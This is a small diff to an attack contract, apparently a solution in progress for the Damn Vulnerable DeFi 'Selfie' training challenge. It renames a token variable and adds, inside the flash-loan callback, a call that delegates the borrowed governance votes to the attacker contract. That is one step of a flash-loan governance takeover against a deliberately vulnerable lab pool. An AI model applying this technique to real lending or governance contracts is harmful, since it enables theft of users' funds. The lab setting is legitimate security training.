@@ -13,7 +13,7 @@ contract AttackSelfie is IERC3156FlashBorrower {
 
     SelfiePool pool;
     SimpleGovernance governance;
-    DamnValuableVotes damnValueToken;
+    DamnValuableVotes damnValuableToken;
     uint actionId;
 
     bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
@@ -35,6 +35,6 @@ contract AttackSelfie is IERC3156FlashBorrower {
         uint256 fee,
         bytes calldata data
     ) external returns (bytes32) {
-        
+        damnValuableToken.delegate(address(this));
     }
 }
